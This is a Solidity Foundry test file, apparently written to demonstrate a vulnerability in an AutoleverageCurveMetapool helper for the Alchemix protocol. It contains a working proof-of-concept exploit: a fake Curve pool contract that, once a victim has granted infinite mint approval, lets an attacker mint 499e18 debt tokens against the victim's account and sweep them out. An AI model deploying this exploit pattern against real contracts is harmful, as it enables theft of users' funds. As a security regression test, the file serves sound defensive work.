pragma solidity 0.8.13;

import {console} from "forge-std/console.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";

import {DSTestPlus} from "./utils/DSTestPlus.sol";

import {AutoleverageCurveMetapool} from "../AutoleverageCurveMetapool.sol";

import {IAlchemistV2} from "../interfaces/IAlchemistV2.sol";
import {IWhitelist} from "../interfaces/IWhitelist.sol";

contract AutoleverageAttackTest is DSTestPlus, stdCheats {
    IAlchemistV2 alchemist = IAlchemistV2(0x5C6374a2ac4EBC38DeA0Fc1F8716e5Ea1AdD94dd);
    IERC20 token = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 yieldToken = IERC20(0xdA816459F1AB5631232FE5e97a05BBBb94970c95);
    address constant whitelistOwner = 0x9e2b6378ee8ad2A4A95Fe481d63CAba8FB0EBBF9;

    function setUp() external {}

    function testAttack() external {
        AutoleverageCurveMetapool helper = new AutoleverageCurveMetapool();
        AttackingPool attackingPool      = new AttackingPool();

        address victim        = address(0xdead);
        uint256 depositAmount = 1000e18;
        uint256 stealAmount   = 499e18;         // A little bit less than the collateralization

        tip(address(token), address(this), depositAmount);

        // Set up the whitelist properly.
        address whitelist = alchemist.whitelist();
        hevm.prank(whitelistOwner);
        IWhitelist(whitelist).add(address(this));

        hevm.prank(whitelistOwner);
        IWhitelist(whitelist).add(address(helper));

        hevm.prank(whitelistOwner);
        IWhitelist(whitelist).add(address(victim));

        // Initialize the victim's account.
        token.approve(address(alchemist), depositAmount);
        alchemist.depositUnderlying(address(yieldToken), depositAmount, victim, 0);

        // Have the victim set an infinite mint approval on the autoleverage contract.
        hevm.prank(victim);
        alchemist.approveMint(address(helper), type(uint256).max);

        // Fund the attacking pool.
        tip(address(token), address(attackingPool), 5e18);

        // Rock and roll.
        helper.autoleverage(
            address(attackingPool),
            0,                      // Setting these properly doesn't matter since noop impl
            0,
            address(alchemist),
            address(yieldToken),
            0,
            1e18,
            stealAmount,
            victim
        );

        attackingPool.sweep(alchemist.debtToken(), stealAmount);

        assertEq(IERC20(alchemist.debtToken()).balanceOf(address(this)), stealAmount);
    }
}

contract AttackingPool {
    IERC20 token = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 debtToken = IERC20(0xBC6DA0FE9aD5f3b0d58160288917AA56653660E9);

    address immutable public owner;

    constructor() {
        owner = msg.sender;
    }

    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external returns (uint256) {
        // Transfer the tokens from the helper contract.
        debtToken.transferFrom(msg.sender, address(this), dx);

        // We just need to send back enough to pay off the flash loan.
        uint256 balance = token.balanceOf(address(this));
        token.transfer(msg.sender, balance);
        return balance;
    }

    function sweep(address token, uint256 amount) external {
        require(owner == msg.sender, "No touching me lucky charms");
        IERC20(token).transfer(msg.sender, amount);
    }
}